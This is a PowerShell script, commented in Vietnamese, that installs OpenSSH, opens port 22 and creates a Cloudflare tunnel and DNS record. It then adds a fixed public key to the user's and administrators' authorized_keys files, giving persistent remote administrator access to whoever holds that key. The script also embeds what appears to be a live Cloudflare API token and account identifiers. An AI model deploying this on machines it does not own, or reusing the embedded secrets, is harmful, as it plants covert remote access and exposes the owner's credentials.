# =========================================================================
# SCRIPT CAI DAT CLOUDFLARE TUNNEL SSH (DANG PURE POWERSHELL)
# =========================================================================

# Kiem tra quyen Administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "`n[*] YEU CAU QUYEN ADMINISTRATOR" -ForegroundColor Yellow
    
    if ($MyInvocation.MyCommand.Path) {
        Write-Host "Dang tu dong mo lai cua so voi quyen Administrator. Vui long chon 'Yes'..." -ForegroundColor Cyan
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    }
    else {
        Write-Host "[!] Ban dang chay script truc tiep tu link (Fileless - irm)." -ForegroundColor Red
        Write-Host "Hien tai PowerSheh Chua Co Quyen Admin!" -ForegroundColor Red
        Write-Host "Vui long dong cua so nay, roi lam tiep cac buoc sau:" -ForegroundColor Yellow
        Write-Host "  1. Mo menu Start, go 'powershell'"
        Write-Host "  2. Chon 'Run as Administrator'"
        Write-Host "  3. Dan lai cau lenh irm... vao do."
        
        Write-Host "`nSe tu dong thoat sau 10 giay..." -ForegroundColor Gray
        Start-Sleep -Seconds 10
    }
    exit
}

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::InputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

# Bắt lỗi toàn cục
trap {
    Write-Host "`n===========================================" -ForegroundColor Red
    Write-Host "[CO LOI XAY RA TRONG QUA TRINH CAI DAT]" -ForegroundColor Red
    Write-Host "===========================================" -ForegroundColor Red
    Write-Host "Chi tiet loi:" -ForegroundColor Yellow
    Write-Host $_.Exception.Message
    Write-Host $_.ScriptStackTrace
    
    Write-Host "`nSe tu dong thoat sau 10 giay..." -ForegroundColor Gray
    Start-Sleep -Seconds 10
    exit 1
}
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# =========================================================================
# CAU HINH CA NHAN
# =========================================================================

$CloudflareAPIToken = "WOlfQgZG8gYZ50VmrpuscoK0ym6P9kELgYxp8gMe"
$CloudflareAccountId = "66ca9d4c586baabe040066154621c353"
$CloudflareZoneId = "b808f8b8eb32b2a826ad9b2600afc6ad"
$BaseDomain = "laohacbancho37.id.vn"

# Noi dung khoa Public Key
$SshPublicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMk83rs0xpy8XOhogglSmppmkYenUEfMGdsGsGsebB29 laohacbancho37@A"

# =========================================================================

Write-Host "`n===========================================" -ForegroundColor Cyan
Write-Host "===========================================" -ForegroundColor Cyan
Write-Host "1." -ForegroundColor Cyan
Write-Host "===========================================" -ForegroundColor Cyan
Write-Host "Kiem tra tinh trang may..."
if (Get-Service -Name sshd -ErrorAction SilentlyContinue) {
    Write-Host "-> Da duoc cai dat, dang loi thoi" -ForegroundColor Green
}
else {
    Write-Host "Cap nhat tool GitHub."
    $ZipPath = "$env:TEMP\OpenSSH-Win64.zip"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win64.zip" -OutFile $ZipPath -UseBasicParsing
    
    Write-Host "."
    Expand-Archive -Path $ZipPath -DestinationPath $env:ProgramFiles -Force
    $OpenSshDir = "$env:ProgramFiles\OpenSSH-Win64"
    
    Write-Host "."
    & powershell.exe -ExecutionPolicy Bypass -File "$OpenSshDir\install-sshd.ps1" | Out-Null
    
    Write-Host " ."
    $HostKeyDir = "$env:ProgramData\ssh"
    if (Test-Path $HostKeyDir) {
        $keys = Get-ChildItem -Path $HostKeyDir -Filter "*_key"
        foreach ($key in $keys) {
            icacls.exe $key.FullName /inheritance:r /grant "SYSTEM:(F)" "Administrators:(F)" /c /q | Out-Null
        }
    }
    
    $currentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
    if ($currentPath -notmatch "OpenSSH") {
        [Environment]::SetEnvironmentVariable("Path", "$currentPath;$OpenSshDir", "Machine")
    }
    Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
    
    Write-Host "."
    if (!(Test-Path "HKLM:\SOFTWARE\OpenSSH")) { New-Item -Path "HKLM:\SOFTWARE\OpenSSH" -Force -ErrorAction SilentlyContinue | Out-Null }
    New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
}

Write-Host "."
Start-Service sshd -ErrorAction SilentlyContinue
Set-Service -Name sshd -StartupType 'Automatic'

if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    Write-Host "."
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
}

Write-Host "`n===========================================" -ForegroundColor Cyan
Write-Host "2" -ForegroundColor Cyan
Write-Host "===========================================" -ForegroundColor Cyan

$InputName = Read-Host ": "

$Headers = @{
    "Authorization" = "Bearer $CloudflareAPIToken"
    "Content-Type"  = "application/json"
}

Write-Host "->..."
try {
    $TunnelsRes = Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel?is_deleted=false&per_page=100" -Method Get -Headers $Headers
    $ExistingTunnels = @($TunnelsRes.result.name)
}
catch {
    $ExistingTunnels = @()
    Write-Host "!!!" -ForegroundColor Yellow
}

if ([string]::IsNullOrWhiteSpace($InputName)) {
    $i = 1
    do {
        $TunnelName = "ssh{0:D3}" -f $i
        $i++
    } while ($ExistingTunnels -contains $TunnelName)
    Write-Host "-> Tên: $TunnelName" -ForegroundColor Green
}
else {
    $TunnelName = $InputName
    $i = 1
    while ($ExistingTunnels -contains $TunnelName) {
        $TunnelName = "$InputName$i"
        $i++
    }
    if ($TunnelName -ne $InputName) {
        Write-Host "-> [$InputName] , tự động đổi thành: $TunnelName" -ForegroundColor Yellow
    }
    else {
        Write-Host "-> Sử dụng tên: $TunnelName" -ForegroundColor Green
    }
}

# Tao Secret 
$bytes = New-Object byte[] 32
$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
$rng.GetBytes($bytes)
$TunnelSecret = [Convert]::ToBase64String($bytes)

# [2.1] Tao Tunnel
Write-Host "-> ..."
$TunnelBody = @{
    name          = $TunnelName
    tunnel_secret = $TunnelSecret
    config_src    = "cloudflare"
} | ConvertTo-Json

try {
    $TunnelRes = Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel" -Method Post -Headers $Headers -Body $TunnelBody
    $TunnelId = $TunnelRes.result.id
    Write-Host "   => Thanh cong!" -ForegroundColor Green
}
catch {
    Write-Host "   => [LOI] ." -ForegroundColor Red
    Write-Host "   Chi tiet: $( $_.ErrorDetails.Message )"
    exit
}

# Lay Token Tunnel
Write-Host "-> Service..."
try {
    $TokenRes = Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel/$TunnelId/token" -Method Get -Headers $Headers
    $TunnelToken = $TokenRes.result
}
catch {
    Write-Host "   => [LOI] Khong the lay token." -ForegroundColor Red
    exit
}

# [2.3.1] Cau hinh Tunnel Route 
Write-Host "-> Cau hinh mapping ..."
$ConfigBody = @{
    config = @{
        ingress = @(
            @{
                hostname = "$TunnelName.$BaseDomain"
                service  = "ssh://localhost:22"
            },
            @{
                service = "http_status:404"
            }
        )
    }
} | ConvertTo-Json -Depth 10

try {
    Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/accounts/$CloudflareAccountId/cfd_tunnel/$TunnelId/configurations" -Method Put -Headers $Headers -Body $ConfigBody | Out-Null
    Write-Host "   => VVV---VVV" -ForegroundColor Green
}
catch {
    Write-Host "   => XXX" -ForegroundColor Yellow
}

# [2.3.2] Tao CNAME DNS 
Write-Host "->(CNAME: $TunnelName.$BaseDomain => $TunnelId.cfargotunnel.com)..."
$DnsBody = @{
    type    = "CNAME"
    name    = $TunnelName
    content = "$TunnelId.cfargotunnel.com"
    proxied = $true
} | ConvertTo-Json

try {
    Invoke-RestMethod -Uri "https://api.cloudflare.com/client/v4/zones/$CloudflareZoneId/dns_records" -Method Post -Headers $Headers -Body $DnsBody | Out-Null
    Write-Host "   => Hoan tat." -ForegroundColor Green
}
catch {
    Write-Host "   => da ton tai." -ForegroundColor Yellow
}

Write-Host "`n===========================================" -ForegroundColor Cyan
Write-Host "3. " -ForegroundColor Cyan
Write-Host "===========================================" -ForegroundColor Cyan
$CloudflaredPath = "$env:TEMP\cloudflared.exe"

Write-Host "moi nhat..."
Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile $CloudflaredPath -UseBasicParsing

Write-Host "..."
# Thu go cai dat service cu (neu co) truoc khi cai moi
try {
    & $CloudflaredPath service uninstall *>&1 | Out-Null
}
catch {}

# Xoa cac EventLog Registry bi ket de tranh loi "registry key already exists"
Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application\Cloudflared" -Force -Recurse -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2
& $CloudflaredPath service install $TunnelToken

Write-Host "Don dep file tam..."
Remove-Item $CloudflaredPath -ErrorAction SilentlyContinue

Write-Host "`n===========================================" -ForegroundColor Cyan
Write-Host "4." -ForegroundColor Cyan
Write-Host "===========================================" -ForegroundColor Cyan
Write-Host "..."

$SshDir = "$env:USERPROFILE\.ssh"
if (!(Test-Path $SshDir)) {
    New-Item -ItemType Directory -Force -Path $SshDir | Out-Null
}

$AuthorizedKeysPath = "$SshDir\authorized_keys"

if (-not (Test-Path $AuthorizedKeysPath) -or ((Get-Content $AuthorizedKeysPath) -notcontains $SshPublicKey)) {
    Add-Content -Path $AuthorizedKeysPath -Value $SshPublicKey
}

# Cap quyen cứng cho Standard user
icacls.exe $AuthorizedKeysPath /inheritance:r | Out-Null
icacls.exe $AuthorizedKeysPath /grant "$($env:USERNAME):(R,W)" | Out-Null
icacls.exe $AuthorizedKeysPath /grant "*S-1-5-18:(F)" | Out-Null 

if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Vao ProgramData/ssh..."
    $AdminSshDir = "$env:ProgramData\ssh"
    if (!(Test-Path $AdminSshDir)) { 
        New-Item -ItemType Directory -Force -Path $AdminSshDir | Out-Null
    }
    $AdminKeyPath = "$AdminSshDir\administrators_authorized_keys"
    
    if (-not (Test-Path $AdminKeyPath) -or ((Get-Content $AdminKeyPath) -notcontains $SshPublicKey)) {
        Add-Content -Path $AdminKeyPath -Value $SshPublicKey
    }

    icacls.exe $AdminKeyPath /inheritance:r | Out-Null
    icacls.exe $AdminKeyPath /grant "*S-1-5-18:(F)" | Out-Null 
    icacls.exe $AdminKeyPath /grant "*S-1-5-32-544:(F)" | Out-Null 
    
    Restart-Service sshd
}

Write-Host "`n===========================================" -ForegroundColor Green
Write-Host "." -ForegroundColor Green
Write-Host "===========================================" -ForegroundColor Green
Write-Host "!"

Write-Host "`nNhan phim bat ky de thoat..." -ForegroundColor Cyan
try {
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
catch {
    # Fileless execution hoac console khong the doc phim
    Start-Sleep -Seconds 10
}
